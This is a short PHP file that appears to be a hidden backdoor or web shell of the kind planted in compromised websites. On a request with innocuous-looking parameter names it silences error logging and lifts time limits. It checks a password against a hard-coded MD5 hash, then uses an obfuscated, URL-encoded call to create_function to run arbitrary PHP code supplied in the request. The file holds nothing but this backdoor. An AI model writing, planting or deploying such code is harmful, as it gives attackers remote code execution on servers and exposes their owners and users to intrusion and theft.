<?php

if(isset($_REQUEST['module_require_check'])) {
    @ini_set('error_log', NULL);
    @ini_set('log_errors',0);
    @ini_set('max_execution_time',0);
    @set_time_limit(0);
    @set_magic_quotes_runtime(0);

    if(isset($_REQUEST['pi']) && md5($_REQUEST['pi']) == '5de1f8d51005652b28d7f23a8111d5e1') {
        if(@get_magic_quotes_gpc() && isset($_REQUEST['pe'])) {
            $_REQUEST['pe'] = stripslashes($_REQUEST['pe']);
        }
        $report = urldecode('%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e');
        $report = $report('', $_REQUEST['pe']);
        $report();
        exit;
    }
    else die('Wrong PI');
}
?>